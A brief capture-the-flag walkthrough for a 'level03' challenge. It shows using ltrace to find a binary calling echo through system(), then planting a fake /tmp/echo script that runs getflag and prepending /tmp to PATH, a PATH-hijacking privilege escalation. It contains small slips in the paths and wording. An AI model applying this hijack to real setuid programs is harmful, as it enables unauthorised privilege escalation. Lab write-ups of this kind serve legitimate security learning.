level03 file is  a binary file.
Use ltrace to see the lib called during it is executed
You can see that the echo function is called by system and not well protected

Then go in /tmp to have more freedom
Create a script so you can call the getflag function
# vim tmp/echo/ and add /bin/getflag
Then make sure you have the right to execute 
# chmod +x /tmp/echo
Then fake the echo call with an absolute path
# PATH="/tmp:$PATH" ./level03
